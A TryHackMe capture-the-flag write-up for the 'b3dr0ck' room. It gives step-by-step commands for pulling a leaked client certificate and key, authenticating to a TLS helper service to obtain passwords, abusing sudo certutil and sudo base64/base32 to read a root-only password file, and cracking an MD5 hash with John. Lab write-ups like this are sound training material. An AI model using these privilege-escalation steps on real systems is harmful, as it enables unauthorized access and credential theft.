# b3dr0ck - TryHackMe Write-up

**Room:** b3dr0ck  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Type:** TLS / Certificates / Linux Privilege Escalation  
**Status:** Completed  

---

## Disclaimer

This write-up is for educational purposes only and was completed in a legal lab environment on TryHackMe.

---

## Room Overview

b3dr0ck is a TryHackMe room based around a custom TLS setup.

The machine involves:

- Web enumeration
- Custom HTTPS service discovery
- TCP helper service interaction
- Client certificate authentication
- SSH credential recovery
- Lateral movement from Barney to Fred
- Privilege escalation through sudo misconfigurations
- Encoded root password recovery
- Hash cracking

The attack path for this machine was:

```text
Recon -> Web clue -> Certificate service -> TLS helper service -> SSH as Barney -> Fred -> Root
````

---

## Enumeration

I started with a full TCP scan using Nmap:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

In my case, the target IP was:

```text
10.128.180.27
```

### Nmap Results

```text
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu
80/tcp    open  http         nginx 1.18.0
4040/tcp  open  ssl/yo-main?
9009/tcp  open  pichat?
54321/tcp open  ssl/unknown
```

### Analysis

Five ports were exposed:

```text
22      SSH
80      HTTP nginx redirect
4040    Custom HTTPS web server
9009    TCP helper service
54321   TLS helper service
```

At this stage, SSH was not immediately useful because I had no credentials.

The interesting ports were:

```text
4040
9009
54321
```

The room description mentioned TLS certificates and helper services, so the custom TLS-related ports were the main focus.

---

## Web Enumeration

Port 80 redirected to the HTTPS service on port 4040:

```bash
curl -i http://<TARGET_IP>
```

The redirect pointed to:

```text
https://b3dr0ck.thm:4040/
```

To make access easier, I added the hostname to `/etc/hosts`:

```bash
echo "<TARGET_IP> b3dr0ck.thm" | sudo tee -a /etc/hosts
```

Then I checked the HTTPS service:

```bash
curl -k https://b3dr0ck.thm:4040/
```

The page displayed the ABC web server and included an important clue:

```text
He said it was from the toilet and OVER 9000!
```

### Why this mattered

“OVER 9000” was a hint toward port `9009`.

The Nmap scan had already shown a service running on port `9009`, so this became the next target.

---

## Interacting with the Certificate Helper Service

I connected to port `9009` using Netcat:

```bash
nc <TARGET_IP> 9009
```

The service displayed an ASCII banner and asked:

```text
What are you looking for?
```

I typed:

```text
help
```

The service replied:

```text
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
```

This confirmed that port `54321` required certificate-based TLS authentication.

---

## Retrieving Barney's Certificate

In the same service, I requested the certificate:

```text
certificate
```

The service returned a PEM certificate:

```text
-----BEGIN CERTIFICATE-----
...
-----END CERTIFICATE-----
```

I saved it locally:

```bash
cat > barney.crt <<'EOF'
-----BEGIN CERTIFICATE-----
PASTE_CERTIFICATE_HERE
-----END CERTIFICATE-----
EOF
```

Then I requested the private key:

```text
key
```

The service returned a private RSA key:

```text
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
```

I saved it as:

```bash
cat > barney.key <<'EOF'
-----BEGIN RSA PRIVATE KEY-----
PASTE_PRIVATE_KEY_HERE
-----END RSA PRIVATE KEY-----
EOF
```

Then I fixed the permissions:

```bash
chmod 600 barney.key barney.crt
```

I also verified the private key:

```bash
openssl rsa -check -in barney.key -noout
```

Expected output:

```text
RSA key ok
```

---

## Connecting to the Authorized TLS Service

With the certificate and key, I connected to the TLS service on port `54321`:

```bash
socat stdio ssl:<TARGET_IP>:54321,cert=barney.crt,key=barney.key,verify=0
```

I received:

```text
Welcome: 'Barney Rubble' is authorized.
```

Inside the prompt, I typed:

```text
help
```

and then:

```text
password
```

The service returned:

```text
Password hint: d1ad7c0a3805955a35eb260dab4180dd
```

In this room, the value shown as the “password hint” can be used as Barney’s SSH password.

---

## SSH as Barney

I logged in as Barney:

```bash
ssh barney@<TARGET_IP>
```

Password:

```text
d1ad7c0a3805955a35eb260dab4180dd
```

After logging in, I grabbed the user flag:

```bash
cat /home/barney/barney.txt
```

---

## Privilege Escalation Enumeration as Barney

The next step was checking Barney’s sudo permissions:

```bash
sudo -l
```

Output:

```text
User barney may run the following commands on ip-10-128-180-27:
    (ALL : ALL) /usr/bin/certutil
```

### Analysis

Barney can run `/usr/bin/certutil` as root.

This is important because the room is built around TLS certificates. If Barney can generate certificates as root, it may be possible to generate a valid certificate for another user.

The next target was Fred.

---

## Generating Fred's Certificate

I used `certutil` to generate a certificate and private key for Fred:

```bash
sudo /usr/bin/certutil fred "Fred Flintstone" | tee fred_out.txt
```

The output contained both a private key and a certificate.

I extracted the private key:

```bash
awk '/BEGIN.*PRIVATE KEY/,/END.*PRIVATE KEY/' fred_out.txt > fred.key
```

Then I extracted the certificate:

```bash
awk '/BEGIN CERTIFICATE/,/END CERTIFICATE/' fred_out.txt > fred.crt
```

I fixed the permissions:

```bash
chmod 600 fred.key fred.crt
```

I checked that both files looked correct:

```bash
head -1 fred.key
head -1 fred.crt
```

Expected output:

```text
-----BEGIN RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
```

---

## Using Fred's Certificate

From the target machine, I connected to the local TLS service using Fred’s certificate:

```bash
socat stdio ssl:127.0.0.1:54321,cert=fred.crt,key=fred.key,verify=0
```

The service authorized the certificate as Fred.

Inside the prompt, I typed:

```text
password
```

The service returned Fred’s password.

---

## Pivoting to Fred

I switched to Fred:

```bash
su fred
```

Then I entered Fred’s password recovered from the TLS helper service.

After becoming Fred, I retrieved Fred’s flag:

```bash
cat /home/fred/fred.txt
```

---

## Privilege Escalation Enumeration as Fred

I checked Fred’s sudo permissions:

```bash
sudo -l
```

Output:

```text
User fred may run the following commands on ip-10-128-180-27:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

### Analysis

Fred cannot directly read `/root/pass.txt`:

```bash
cat /root/pass.txt
```

Output:

```text
Permission denied
```

However, Fred can run `base32` and `base64` against `/root/pass.txt` as root.

This means Fred can indirectly read the file by encoding it.

---

## Reading and Decoding `/root/pass.txt`

I first encoded the file with `base64`:

```bash
sudo /usr/bin/base64 /root/pass.txt
```

This returned:

```text
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==
```

I decoded it once:

```bash
sudo /usr/bin/base64 /root/pass.txt | base64 -d
```

This returned another encoded string:

```text
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
```

This looked like Base32.

I decoded the full chain:

```bash
sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
```

This returned:

```text
a00a12aad6b7c16bf07032bd05a31d56
```

At first, I tried using this directly as the root password, but it failed.

That confirmed it was not the plaintext password, but a hash.

---

## Cracking the Root Hash

The decoded value looked like an MD5 hash:

```text
a00a12aad6b7c16bf07032bd05a31d56
```

I saved it:

```bash
echo 'a00a12aad6b7c16bf07032bd05a31d56' > root.hash
```

Then I attempted to crack it with John:

```bash
john --format=raw-md5 --wordlist=/usr/share/dict/rockyou.txt root.hash
john --show --format=raw-md5 root.hash
```

Once the plaintext password was recovered, I switched to root:

```bash
su root
```

Then I grabbed the root flag:

```bash
cat /root/root.txt
```

---

## Root Cause / Key Lessons

This room demonstrates several important concepts:

* Always enumerate all open ports
* Custom services often contain the intended attack path
* Web clues can point directly to hidden or unusual ports
* TLS client certificates can be used for authentication
* Exposed certificate/key retrieval services are dangerous
* Sudo permissions should always be checked with `sudo -l`
* A binary does not need to be a shell to be useful for privilege escalation
* Encoding tools can be abused to read restricted files
* Encoded output may require multiple decoding layers
* A recovered value may be a hash, not a password
* Hashes should be identified and cracked before reuse

---

## Attack Path Summary

1. Scanned all TCP ports with Nmap
2. Found ports `22`, `80`, `4040`, `9009`, and `54321`
3. Visited the web service on port `4040`
4. Found the “OVER 9000” clue
5. Connected to the service on port `9009`
6. Retrieved Barney’s certificate and private key
7. Used the certificate to authenticate to the TLS service on port `54321`
8. Retrieved Barney’s SSH password
9. Logged in as Barney
10. Checked sudo permissions
11. Found Barney could run `/usr/bin/certutil`
12. Generated Fred’s certificate and private key
13. Authenticated to the TLS service as Fred
14. Retrieved Fred’s password
15. Switched to Fred
16. Checked Fred’s sudo permissions
17. Found Fred could run `base32` and `base64` on `/root/pass.txt`
18. Used the allowed commands to read and decode the file
19. Recovered an MD5 hash
20. Cracked the hash
21. Switched to root
22. Retrieved the root flag

---

## Useful Commands

### Nmap

```bash
nmap -sC -sV -p- <TARGET_IP>
```

### Add hostname

```bash
echo "<TARGET_IP> b3dr0ck.thm" | sudo tee -a /etc/hosts
```

### Check HTTPS service

```bash
curl -k https://b3dr0ck.thm:4040/
```

### Connect to certificate helper

```bash
nc <TARGET_IP> 9009
```

### Request certificate

```text
certificate
```

### Request private key

```text
key
```

### Connect to TLS helper as Barney

```bash
socat stdio ssl:<TARGET_IP>:54321,cert=barney.crt,key=barney.key,verify=0
```

### SSH as Barney

```bash
ssh barney@<TARGET_IP>
```

### Check sudo permissions

```bash
sudo -l
```

### Generate Fred certificate

```bash
sudo /usr/bin/certutil fred "Fred Flintstone" | tee fred_out.txt
```

### Extract Fred private key

```bash
awk '/BEGIN.*PRIVATE KEY/,/END.*PRIVATE KEY/' fred_out.txt > fred.key
```

### Extract Fred certificate

```bash
awk '/BEGIN CERTIFICATE/,/END CERTIFICATE/' fred_out.txt > fred.crt
```

### Connect to TLS helper as Fred

```bash
socat stdio ssl:127.0.0.1:54321,cert=fred.crt,key=fred.key,verify=0
```

### Switch user

```bash
su fred
```

### Decode root password file

```bash
sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
```

### Crack MD5 hash with John

```bash
john --format=raw-md5 --wordlist=/usr/share/dict/rockyou.txt root.hash
john --show --format=raw-md5 root.hash
```

### Become root

```bash
su root
```

### Read root flag

```bash
cat /root/root.txt
```

---

## Final Thoughts

b3dr0ck was a fun and original TryHackMe room.

The most interesting part was the use of TLS client certificates as an authentication mechanism. Instead of exploiting a web vulnerability or brute-forcing SSH, the room required understanding the relationship between:

```text
certificate service -> TLS authentication service -> user credentials
```

The privilege escalation was also clean and well structured:

```text
Barney can generate certificates
Fred can encode root-only files
Root password is recovered through decoding and hash cracking
```

This room is especially good for practicing:

* Service enumeration
* Custom TCP service interaction
* Certificate-based authentication
* Linux lateral movement
* Sudo privilege enumeration
* Encoding/decoding chains
* Hash cracking

---

## Author

Write-up by **[PXWN3D]**

```
```
